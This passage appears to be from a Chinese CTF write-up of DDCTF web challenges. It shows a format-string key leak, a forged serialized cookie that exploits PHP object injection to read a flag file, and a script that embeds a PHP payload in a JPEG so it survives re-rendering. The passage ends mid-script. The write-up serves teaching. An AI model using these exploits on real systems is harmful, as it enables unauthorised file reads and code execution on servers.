class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;response($data=file_get_contents($path),<span class="string">&#x27;Congratulations&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>  <strong>url:app/Session.php</strong></p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;Application.php&#x27;</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Session</span> <span class="keyword">extends</span> <span class="title">Application</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//key建议为8位字符串</span></span><br><span class="line">    <span class="keyword">var</span> $eancrykey                  = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_expiration            = <span class="number">7200</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_name                = <span class="string">&#x27;ddctf_id&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_path                = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_domain                = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">var</span> $cookie_secure                = <span class="literal">FALSE</span>;</span><br><span class="line">    <span class="keyword">var</span> $activity                   = <span class="string">&quot;DiDiCTF&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">parent</span>::auth()) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;get_key();</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;session_read()) &#123;</span><br><span class="line">                $data = <span class="string">&#x27;DiDI Welcome you %s&#x27;</span>;</span><br><span class="line">                $data = sprintf($data,$_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]);</span><br><span class="line">                <span class="built_in">parent</span>::response($data,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;session_create();</span><br><span class="line">                $data = <span class="string">&#x27;DiDI Welcome you&#x27;</span>;</span><br><span class="line">                <span class="built_in">parent</span>::response($data,<span class="string">&#x27;sucess&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">get_key</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="comment">//eancrykey  and flag under the folder</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;eancrykey =  file_get_contents(<span class="string">&#x27;../config/key.txt&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">session_read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($_COOKIE)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $session = $_COOKIE[<span class="keyword">$this</span>-&gt;cookie_name];</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">isset</span>($session)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;session not found&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $hash = substr($session,strlen($session)<span class="number">-32</span>);</span><br><span class="line">        $session = substr($session,<span class="number">0</span>,strlen($session)<span class="number">-32</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($hash !== md5(<span class="keyword">$this</span>-&gt;eancrykey.$session)) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&quot;the cookie data not match&quot;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $session = unserialize($session);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!is_array($session) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;session_id&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;ip_address&#x27;</span>]) <span class="keyword">OR</span> !<span class="keyword">isset</span>($session[<span class="string">&#x27;user_agent&#x27;</span>]))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_POST[<span class="string">&quot;nickname&quot;</span>])) &#123;</span><br><span class="line">            $arr = <span class="keyword">array</span>($_POST[<span class="string">&quot;nickname&quot;</span>],<span class="keyword">$this</span>-&gt;eancrykey);</span><br><span class="line">            $data = <span class="string">&quot;Welcome my friend %s&quot;</span>;</span><br><span class="line">            <span class="keyword">foreach</span> ($arr <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">                $data = sprintf($data,$v);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">parent</span>::response($data,<span class="string">&quot;Welcome&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">&#x27;ip_address&#x27;</span>] != $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the ip addree not match&#x27;</span>.<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($session[<span class="string">&#x27;user_agent&#x27;</span>] != $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>]) &#123;</span><br><span class="line">            <span class="built_in">parent</span>::response(<span class="string">&#x27;the user agent not match&#x27;</span>,<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">session_create</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $sessionid = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="keyword">while</span>(strlen($sessionid) &lt; <span class="number">32</span>) &#123;</span><br><span class="line">            $sessionid .= mt_rand(<span class="number">0</span>,mt_getrandmax());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $userdata = <span class="keyword">array</span>(</span><br><span class="line">            <span class="string">&#x27;session_id&#x27;</span> =&gt; md5(uniqid($sessionid,<span class="literal">TRUE</span>)),</span><br><span class="line">            <span class="string">&#x27;ip_address&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_agent&#x27;</span> =&gt; $_SERVER[<span class="string">&#x27;HTTP_USER_AGENT&#x27;</span>],</span><br><span class="line">            <span class="string">&#x27;user_data&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        );</span><br><span class="line"></span><br><span class="line">        $cookiedata = serialize($userdata);</span><br><span class="line">        $cookiedata = $cookiedata.md5(<span class="keyword">$this</span>-&gt;eancrykey.$cookiedata);</span><br><span class="line">        $expire = <span class="keyword">$this</span>-&gt;cookie_expiration + time();</span><br><span class="line">        setcookie(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_name,</span><br><span class="line">            $cookiedata,</span><br><span class="line">            $expire,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_path,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_domain,</span><br><span class="line">            <span class="keyword">$this</span>-&gt;cookie_secure</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ddctf = <span class="keyword">new</span> Session();</span><br><span class="line">$ddctf-&gt;index();</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><blockquote><p>分析这两个php文件，仅仅两个类而已，不过本人太菜，分析了1天，第一个文件<code>app/Application.php</code>定义了一个<code>Application</code>类；第二个文件<code>app/Session.php</code>也是一个类，不过这个<code>Session</code>类是继承于<code>Application</code>类，然后最后定义一个对象<code>ddctf</code>,这个对象调用<code>index()</code>函数。大概过程就是这样，比较简单。主要就是里面的东西。接下来稍微具体的分析下两个文件里面功能设计。</p></blockquote><blockquote><p>第一个文件：首先是定义了一个<code>$path</code>；然后是<code>response()</code>函数，这个函数主要是输出信息的，接着是<code>auth()</code>认证函数，这个就是控制访问权限的，可以看到要想通过认证，必须使<code>$_SERVER[&#39;HTTP_DIDICTF_USERNAME&#39;]</code>等于<code>admin</code>,即HTTP头部字段<code>didictf_username</code>为<code>admin</code>；接下来是<code>sanitizepath()</code>函数，这个函数是对变量<code>path</code>的字符串的过滤，这个地方随后会用的到，开始没想到这个地方；接下来就是类中的析构函数<code>__destruct</code>，可以看到，如果<code>path</code>变量为空，就会退出，<code>path</code>变量长度不是18位也会退出，最后是读取<code>path</code>路径的文件内容并使用<code>response()</code>输出。</p></blockquote><blockquote><p>第二个文件：继承于上个文件中的类，之前说过，里面开始定义了一些类中变量；下面第一个函数为<code>index()</code>函数，这个文件在这里面也是相当于一个主函数了，里面主要调用的是<code>session_read()</code>和<code>session_create()</code>两个函数，同时还使用<code>parent</code>关键字调用使用父类中的<code>response()</code>函数；还有一个<code>get_key()</code>函数，功能是相当于读取<code>../config/key.txt</code>中8位的密钥吧，之前也有提示下面会用到，不过此处有个提示<code>//eancrykey  and flag under the folder</code>,提示说的是<code>flag</code>也在这个文件夹下。</p></blockquote><blockquote><p>具体还是说一下<code>session_read()</code>和<code>session_create()</code>两个函数，在<code>index()</code>函数里面，如果请求包里面没有设置<code>cookie</code>就会启用<code>session_create()</code>函数，反之，设置有<code>cookie</code>,就会调用<code>session_create()</code>函数。<code>session_create()</code>函数是创建cookie的函数，里面没什么要说的；<code>session_read()</code>函数是读取cookie，通过分析可以知道，如果我们知道key就可以任意构造cookie了，关键是如何将key值输出。关键代码如下：</p></blockquote><pre><code>&lt;!--hexoPostRenderEscape:&lt;figure class=&quot;highlight php&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!&lt;span class=&quot;keyword&quot;&gt;empty&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $arr = &lt;span class=&quot;keyword&quot;&gt;array&lt;/span&gt;($_POST[&lt;span class=&quot;string&quot;&gt;&amp;quot;nickname&amp;quot;&lt;/span&gt;],&lt;span class=&quot;keyword&quot;&gt;$this&lt;/span&gt;-&amp;gt;eancrykey);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       $data = &lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome my friend %s&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;keyword&quot;&gt;foreach&lt;/span&gt; ($arr &lt;span class=&quot;keyword&quot;&gt;as&lt;/span&gt; $k =&amp;gt; $v) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;           $data = sprintf($data,$v);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;       &lt;span class=&quot;built_in&quot;&gt;parent&lt;/span&gt;::response($data,&lt;span class=&quot;string&quot;&gt;&amp;quot;Welcome&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;   &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;:hexoPostRenderEscape--&gt;</code></pre><blockquote><p>可以看到此处有输出数组，但是关键此处输出只能输出nickname的值，因为nickname的值把%s占位符替代之后，循环到<code>$this-&gt;eancrykey</code>时候，就无法输出<code>$this-&gt;eancrykey</code>，例如假如post的数据为nickname=zzqsmile,$data就变成了”Welcome my friend zzqsmile”,此时我们要仔细想一想如和才能绕过第一个POST的数据，来输出$this-&gt;eancrykey，仔细想下可能会想到吧，就是直接传入<code>%s</code>作为nickname变量的值，这样就能够将遍历到<code>$this-&gt;eancrykey</code>的值拼接到$data并通过父类response()函数输出。拿到$this-&gt;eancrykey的值就可以随便构造Cookie。</p></blockquote><blockquote><p>分析到这人已经蒙了，怎么才能输出flag呢？这时候又要回去看<code>Application.php</code>文件中类的析构函数了，析构函数中可以读取<code>$path</code>的文件内容，因此，仅仅需要用心构造好一个cookie，将文件路径写进$path，等到触发析构函数的时候让其输出flag文件内容，此时又需要一个脑洞，通过提示知道文件路径是18位，flag文件和key在一个文件夹下，因此猜想路径为<code>../config/flag.txt</code>,正好18位。但是之前对<code>../</code>进行过滤了，所以在构造序列化对象时候要构造成<code>..././config/flag.txt</code>，分析完之后就开干。</p></blockquote><blockquote><p>访问<code>app/Session.php</code>文件。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-522c073c2caf7034.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>可以看到开始没有cookie时会设置cookie。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-016596ada51019bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>可以看到图中标记红色部分<code>1a303cbea7ecff312df1cbd194e1def0</code>即是<code>$cookiedata.md5($this-&gt;eancrykey.$cookiedata);</code>的结果。这个cookie是通过是一个合法的cookie，那么如果我们将这段合法的cookie带进头部，程序是不是就会读取这段cookie了，这样程序就会执行到<code>session_read()</code>里面，如下：</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-e90ce3f8764b4cee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>没毛病，按照之前分析，下一步得到<code>$this-&gt;eancrykey</code>的值<code>EzblrbNS</code>，不过此处要注意的是<code>Content-Type:</code>字段值是否为：<code>application/x-www-form-urlencoded</code>，关键点都已在下图标出。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-6745c8a86d272f51.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>得到<code>$this-&gt;eancrykey</code>值接下来就写个很low的脚本构造下cookie。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">Class Application &#123;</span><br><span class="line">    var $path &#x3D; &#39;...&#x2F;.&#x2F;config&#x2F;flag.txt&#39;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;$this-&gt;eancrykey</span><br><span class="line">$zzz &#x3D; new Application();</span><br><span class="line">$b &#x3D; serialize($zzz); </span><br><span class="line">echo &quot;$b&quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#x2F;&#x2F;$b&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;</span><br><span class="line">$a &#x3D; $b.md5(&#39;EzblrbNS&#39;.$b);</span><br><span class="line">echo $a; </span><br><span class="line">&#x2F;&#x2F;$a&#x2F;&#x2F; O:11:&quot;Application&quot;:1:&#123;s:4:&quot;path&quot;;s:21:&quot;...&#x2F;.&#x2F;config&#x2F;flag.txt&quot;;&#125;5a014dbe49334e6dbb7326046950bee2 </span><br><span class="line">&#x2F;&#x2F;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo urlencode($a);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F;urlencode($a)&#x2F;&#x2F;  O%3A11%3A%22Application%22%3A1%3A%7Bs%3A4%3A%22path%22%3Bs%3A21%3A%22...%2F.%2Fconfig%2Fflag.txt%22%3B%7D5a014dbe49334e6dbb7326046950bee2</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>最后成功拿到flag。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/8166147-55d4a65bf7b8ae24.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><hr><h5 id="Upload-IMG"><a href="#Upload-IMG" class="headerlink" title="Upload-IMG"></a>Upload-IMG</h5><ul><li><p>题目地址</p><p>  [<a href="http://117.51.148.166/upload.php%EF%BC%89(http://117.51.148.166/upload.php)">http://117.51.148.166/upload.php）(http://117.51.148.166/upload.php)</a></p></li><li><p>解题过程</p></li></ul><p>1). 按照给的认证用户名，密码进入题目</p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-acbe98e459b5fe62.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><p><img src="https://upload-images.jianshu.io/upload_images/8166147-c6852cfcdc0361e9.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><blockquote><p>通过测试发现，主要是只能上传图片，题目是通过文件内容中有<code>phpinfo()</code>字符串来决定是否通关的，测试发现，上传的图片是被经过<code>二次渲染</code>的，因此，就要绕过二次渲染，使其<code>phpinfo()</code>内容不发生改变。</p></blockquote><p>2). 直接用据说国外牛人写的脚本制作图片马。</p><p><strong>脚本jpg_payload.php：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().</span></span><br><span class="line"><span class="comment">    It is necessary that the size and quality of the initial image are the same as those of the processed image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    1) Upload an arbitrary image via secured files upload script</span></span><br><span class="line"><span class="comment">    2) Save the processed image and launch:</span></span><br><span class="line"><span class="comment">    jpg_payload.php &lt;jpg_name.jpg&gt;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    In case of successful injection you will get a specially crafted image, which should be uploaded again.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Since the most straightforward injection method is used, the following problems can occur:</span></span><br><span class="line"><span class="comment">    1) After the second processing the injected data may become partially corrupted.</span></span><br><span class="line"><span class="comment">    2) The jpg_payload.php script outputs &quot;Something&#x27;s wrong&quot;.</span></span><br><span class="line"><span class="comment">    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    Sergey Bobrov <span class="doctag">@Black</span>2Fan.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    See also:</span></span><br><span class="line"><span class="comment">    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"></span><br><span class="line">    $miniPayload = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($argv[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>($pad = <span class="number">0</span>; $pad &lt; <span class="number">1024</span>; $pad++) &#123;</span><br><span class="line">        $nullbytePayloadSize = $pad;</span><br><span class="line">        $dis = <span class="keyword">new</span> DataInputStream($argv[<span class="number">1</span>]);</span><br><span class="line">        $outStream = file_get_contents($argv[<span class="number">1</span>]);</span><br><span class="line">        $extraBytes = <span class="number">0</span>;</span><br><span class="line">        $correctImage = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>($dis-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!$dis-&gt;eof()) &amp;&amp; ($dis-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            $marker = $dis-&gt;readByte();</span><br><span class="line">            $size = $dis-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            $dis-&gt;skip($size);</span><br><span class="line">            <span class="keyword">if</span>($marker === <span 